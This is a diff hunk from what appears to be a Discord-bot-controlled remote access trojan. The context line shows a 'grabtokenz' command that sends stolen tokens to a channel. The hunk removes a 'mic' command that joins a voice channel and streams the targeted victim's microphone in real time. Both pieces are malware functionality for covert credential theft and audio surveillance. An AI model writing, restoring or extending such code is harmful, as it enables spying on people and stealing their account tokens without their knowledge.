@@ -1019,21 +1019,6 @@ async def grabtokenz(ctx, user):
             await ctx.send("Done. Check the tokens channel.")    
 
 
-@bot.command(name="mic")
-async def recordmic(ctx, user):
-    if user == name:
-        try:
-            channel = bot.get_channel(1335115941444587615)
-            if channel:
-                vc = await channel.connect(self_deaf=True)
-            else:
-                await ctx.send("Channel not found.")
-
-            vc.play(PyAudioPCM())
-            await ctx.send('`[' + current_time() + '] Joined voice-channel and streaming microphone in realtime`')
-
-        except Exception as e:
-            await ctx.send(f"Error occurred: {str(e)}")
 
 
 
